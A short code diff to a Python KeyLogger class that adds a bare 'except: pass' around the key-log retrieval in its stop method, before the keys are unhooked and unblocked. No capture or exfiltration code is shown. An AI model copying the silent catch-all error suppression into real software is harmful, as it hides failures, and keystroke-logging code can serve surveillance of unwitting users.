@@ -57,6 +57,8 @@ class KeyLogger:
     def stop(self):
         try:
             self.hooker.get_key_log()
+        except:
+            pass
         finally:
             self.unhook_keys()
             self.unblock_keys()
